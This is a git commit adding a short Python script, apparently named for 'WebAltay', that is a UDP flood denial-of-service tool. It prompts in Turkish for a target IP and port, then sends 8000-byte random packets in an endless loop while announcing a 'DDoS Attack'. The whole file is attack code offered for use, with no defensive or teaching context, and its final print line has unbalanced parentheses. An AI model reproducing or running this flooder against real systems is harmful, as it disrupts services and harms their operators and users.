630d2051f15ee5a771bb3bd878eb41da640a4d04
SonTurk110 <63609439+SonTurk110@users.noreply.github.com>
2020-07-24 23:57:58 +0300

    Add files via upload

---
+++ webaltayddos.py
@@ -0,0 +1,24 @@
+import socket
+import random
+import os
+os.system("clear")
+banner="""
+  _      __    __   ___   ____              
+ | | /| / /__ / /  / _ | / / /____ ___ __   
+ | |/ |/ / -_) _ \/ __ |/ / __/ _ `/ // /   
+ |__/|__/\__/_.__/_/ |_/_/\__/\_,_/\_, /    
+                                  /___/
+"""
+print(banner)    
+
+ip=raw_input("Hedef İp Adresini Giriniz: ") 
+port=input("Portu Giriniz. Porta 80 Değerini Girmeniz Önerilir.")  
+
+bytes=random._urandom(8000)
+sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+
+sayac=0
+while True:
+        sock.sendto(bytes,(ip,port))
+        sayac=sayac+1
+        print("DDoS Attack Başlatıldı! Gönderilen Paket:%s"%((sayac)
